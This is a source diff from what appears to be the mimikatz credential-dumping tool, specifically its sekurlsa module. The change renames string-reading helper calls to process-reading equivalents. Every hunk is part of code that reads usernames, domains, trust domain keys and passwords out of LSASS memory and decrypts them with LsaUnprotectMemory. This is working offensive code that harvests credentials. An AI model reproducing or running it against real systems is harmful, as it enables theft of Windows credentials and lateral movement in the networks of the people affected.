@@ -321,10 +321,10 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 							sessionData.LogonTime	= *((PFILETIME)		((PBYTE) aBuffer.address + helper->offsetToLogonTime));
 							sessionData.LogonServer	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToLogonServer);
 
-							kull_m_string_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
-							kull_m_string_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
-							kull_m_string_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
-							kull_m_string_getSid(&sessionData.pSid, cLsass.hLsassMem);
+							kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
+							kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
+							kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
+							kull_m_process_getSid(&sessionData.pSid, cLsass.hLsassMem);
 
 							retCallback = callback(&sessionData, pOptionalData);
 
@@ -694,7 +694,7 @@ void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, P
 	{
 		kprintf(L"\n  [%s] ", prefix);
 		kprintf(incoming ? L"-> %wZ\n" : L"%wZ ->\n", domain);
-		if(kull_m_string_getUnicodeString(&keysInfo->password, cLsass.hLsassMem))
+		if(kull_m_process_getUnicodeString(&keysInfo->password, cLsass.hLsassMem))
 		{
 			kprintf(L"\tfrom: ");
 			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
@@ -726,12 +726,12 @@ void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, P
 
 void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
 {
-	if(kull_m_string_getUnicodeString(&info->FullDomainName, cLsass.hLsassMem))
+	if(kull_m_process_getUnicodeString(&info->FullDomainName, cLsass.hLsassMem))
 	{
-		if(kull_m_string_getUnicodeString(&info->NetBiosName, cLsass.hLsassMem))
+		if(kull_m_process_getUnicodeString(&info->NetBiosName, cLsass.hLsassMem))
 		{
 			kprintf(L"\nDomain: %wZ (%wZ", &info->FullDomainName, &info->NetBiosName);
-			if(kull_m_string_getSid(&info->DomainSid, cLsass.hLsassMem))
+			if(kull_m_process_getSid(&info->DomainSid, cLsass.hLsassMem))
 			{
 				kprintf(L" / "); kull_m_string_displaySID(info->DomainSid);
 				LocalFree(info->DomainSid);
@@ -1100,7 +1100,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			kprintf(L"\n\t * Smartcard"); 
 			if(mesCreds->UserName.Buffer)
 			{
-				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
+				if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
 						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
@@ -1129,7 +1129,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
 			{
 				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
-				if(kull_m_string_getUnicodeString(&buffer, cLsass.hLsassMem))
+				if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
 				{
 					if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10) && (pHashPassword->Size > (ULONG) FIELD_OFFSET(LSAISO_DATA_BLOB, data)))
 					{
@@ -1159,21 +1159,21 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			
 			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
 			{
-				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
+				if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
 						username = &mesCreds->UserName;
 					else
 						domain = &mesCreds->UserName;
 				}
-				if(kull_m_string_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
+				if(kull_m_process_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
 						domain = &mesCreds->Domaine;
 					else
 						username = &mesCreds->Domaine;
 				}
-				if(kull_m_string_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
+				if(kull_m_process_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
 						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
